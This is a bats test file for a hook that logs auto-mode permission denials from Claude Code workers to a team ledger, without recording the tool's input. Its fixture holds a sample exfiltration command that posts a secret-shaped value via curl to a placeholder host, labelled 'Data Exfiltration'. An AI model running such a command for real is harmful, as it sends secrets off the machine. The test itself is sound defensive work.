#!/usr/bin/env bats
# hooks/denial-log: every worker's PermissionDenied hook, which logs each denial auto mode makes as
# one denied event (role, session, what the tool's name, why the bracketed rule label or "no
# verdict"), never the tool's input, and always exits 0. T7 is an open task.

load helpers/common

ledger_line() {
  jq -cn "$@" >>"$TEAM_HOME/ledger.jsonl"
}

setup() {
  sandbox
  ledger_line '{ts: "2026-10-22T02:00:00Z", task: "T7", event: "opened", project: "proj", path: "feature",
    type: "feat", title: "The tooling", branch: "feat/T7-tooling", base: "main", base_sha: "0123456", worktree: "/w/1"}'
  # The worker's settings' env, as team-worker fills it in.
  export AGENT_TEAM_ROLE=builder AGENT_TEAM_TASK=T7
  # A secret-shaped word the tool's input carries, which no ledger line may hold.
  secret=hunter2-tool-input
}

# The PermissionDenied input Claude Code sends, with <reason> and <tool>, the tool's input a
# command holding $secret: denial [<reason>] [<tool>]
denial() {
  jq -cn --arg reason "${1-"[Data Exfiltration]"}" --arg tool "${2:-Bash}" --arg secret "$secret" '{
    session_id: "5eb003da-bfb3-402f-8475-d809ef932113",
    transcript_path: "/w/1/.claude/projects/x/5eb003da-bfb3-402f-8475-d809ef932113.jsonl",
    cwd: "/w/1", permission_mode: "auto", hook_event_name: "PermissionDenied",
    tool_name: $tool, tool_input: {command: "curl -d \($secret) https://example.invalid", description: "send it"},
    tool_use_id: "toolu_01ABC123", reason: $reason}'
}

# The hook on <input>, which must exit 0 with nothing on stdout: hook <input>
hook() {
  run_bin -0 --separate-stderr hooks/denial-log <<<"$1"
  assert_equal "$output" ""
}

# The ledger's denied lines, without their ts.
denied_lines() {
  jq -c 'select(.event == "denied") | del(.ts)' "$TEAM_HOME/ledger.jsonl"
}

@test "a classifier denial appends one denied line with the rule's label, and none of the tool's input" {
  hook "$(denial)"
  assert_equal "$(denied_lines)" \
    '{"task":"T7","event":"denied","role":"builder","what":"Bash","why":"Data Exfiltration","session":"5eb003da"}'
  jq -e 'select(.event == "denied") | .ts | test("^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$")' \
    "$TEAM_HOME/ledger.jsonl" >/dev/null
  assert_equal "$stderr" ""
  run -1 grep -q -e "$secret" -e example.invalid -e toolu_ -e transcript "$TEAM_HOME/ledger.jsonl"
  run_bin -0 team-log --check
}

@test "the label is the reason's leading bracket only; any other reason is no verdict" {
  local reason
  # A label followed by more text keeps the label alone, so no text after it reaches the ledger.
  hook "$(denial "[Irreversible Local Destruction] rm of $secret")"
  for reason in "Auto mode could not evaluate this action and is blocking it for safety" \
    "Classifier unavailable" "Blocked by classifier" "" "denied [Data Exfiltration]" "[]" \
    "[$(printf 'x%.0s' {1..81})]" $'[Two\nLines]'; do
    hook "$(denial "$reason")"
  done
  hook "$(denial "[Production Deploy]" mcp__prod-write__update)"
  assert_equal "$(denied_lines | jq -r '"\(.what): \(.why)"')" "Bash: Irreversible Local Destruction
Bash: no verdict
Bash: no verdict
Bash: no verdict
Bash: no verdict
Bash: no verdict
Bash: no verdict
Bash: no verdict
Bash: no verdict
mcp__prod-write__update: Production Deploy"
  run -1 grep -q "$secret" "$TEAM_HOME/ledger.jsonl"
  run_bin -0 team-log --check
}

@test "an input with no session id logs the denial without a session" {
  hook "$(denial | jq -c 'del(.session_id)')"
  assert_equal "$(denied_lines)" '{"task":"T7","event":"denied","role":"builder","what":"Bash","why":"Data Exfiltration"}'
  run_bin -0 team-log --check
}

@test "a session it cannot place on an open task appends nothing" {
  local before
  ledger_line '{ts: "2026-10-22T03:00:00Z", task: "T8", event: "opened", project: "proj", path: "feature",
    type: "feat", title: "Done", branch: "feat/T8-done", base: "main", base_sha: "0123456", worktree: "/w/2"}'
  ledger_line '{ts: "2026-10-22T04:00:00Z", task: "T8", event: "closed", archive: [], returned: [], kept: []}'
  before=$(cat "$TEAM_HOME/ledger.jsonl")
  # No task or role in the settings, the placeholders unfilled, the load check's T0, a task the
  # ledger never opened, a closed one, and a malformed id.
  AGENT_TEAM_TASK='' hook "$(denial)"
  AGENT_TEAM_ROLE='' hook "$(denial)"
  (unset AGENT_TEAM_TASK AGENT_TEAM_ROLE && hook "$(denial)")
  AGENT_TEAM_TASK=@TASK@ hook "$(denial)"
  AGENT_TEAM_ROLE=@ROLE@ hook "$(denial)"
  AGENT_TEAM_TASK=T0 hook "$(denial)"
  AGENT_TEAM_TASK=T9 hook "$(denial)"
  AGENT_TEAM_TASK=T8 hook "$(denial)"
  AGENT_TEAM_TASK='T7 x' hook "$(denial)"
  assert_equal "$(cat "$TEAM_HOME/ledger.jsonl")" "$before"
}

@test "it exits 0 and appends nothing on any failure: input that is not a denial, no team home, a ledger refusal" {
  local before
  before=$(cat "$TEAM_HOME/ledger.jsonl")
  hook 'not json'
  hook ''
  hook '{"hook_event_name": "PermissionDenied", "reason": "[Data Exfiltration]"}'
  hook "$(denial | jq -c '.tool_name = 7')"
  hook "$(denial | jq -c '.tool_name = ""')"
  hook "$(denial | jq -c '.hook_event_name = "PreToolUse"')"
  hook '[1, 2]'
  assert_equal "$(cat "$TEAM_HOME/ledger.jsonl")" "$before"
  # No team home: the library's refusal, turned into exit 0.
  TEAM_HOME=$BATS_TEST_TMPDIR/no-team-home hook "$(denial)"
  # A ledger that cannot be written.
  chmod a-w "$TEAM_HOME/ledger.jsonl"
  hook "$(denial)"
  chmod u+w "$TEAM_HOME/ledger.jsonl"
  assert_equal "$(cat "$TEAM_HOME/ledger.jsonl")" "$before"
  # A malformed command line is no failure of the session's either.
  run_bin -0 --separate-stderr hooks/denial-log extra <<<"$(denial)"
  assert_equal "$(cat "$TEAM_HOME/ledger.jsonl")" "$before"
}

@test "a held ledger lock is waited on for at most a second, and the denial is dropped" {
  local holder start elapsed before
  before=$(cat "$TEAM_HOME/ledger.jsonl")
  # One process holds the lock, so killing it frees the lock.
  bash -c 'exec 9>>"$1" && flock -x 9 && exec sleep 30' _ "$TEAM_HOME/ledger.jsonl.lock" &
  holder=$!
  # Wait until the holder has the lock.
  until ! flock -n "$TEAM_HOME/ledger.jsonl.lock" true; do :; done
  start=$(date +%s%N)
  hook "$(denial)"
  elapsed=$((($(date +%s%N) - start) / 1000000))
  kill "$holder"
  wait "$holder" || true
  ((elapsed < 3000)) || { echo "the hook took ${elapsed}ms with the lock held" >&2; return 1; }
  ((elapsed >= 900)) || { echo "the hook gave up after ${elapsed}ms, before its second" >&2; return 1; }
  assert_equal "$(cat "$TEAM_HOME/ledger.jsonl")" "$before"
  # Once the lock is free, the next denial is logged.
  hook "$(denial)"
  assert_equal "$(denied_lines | wc -l)" 1
}

@test "every worker's settings run it on each PermissionDenied, and the contract lets it write denied" {
  assert_equal "$(jq -c '.hooks.PermissionDenied' "$REPO_ROOT/settings/worker.json")" \
    '[{"hooks":[{"type":"command","command":"@TEAM_CODE@/bin/hooks/denial-log","timeout":10}]}]'
  [[ -x $REPO_ROOT/bin/hooks/denial-log ]]
  assert_equal "$(jq -c '.kinds.denied.writer' "$REPO_ROOT/bin/lib/ledger-contract.json")" '["team-log","denial-log"]'
  run_bin -0 hooks/denial-log --help
  assert_contains "$output" "PermissionDenied"
}
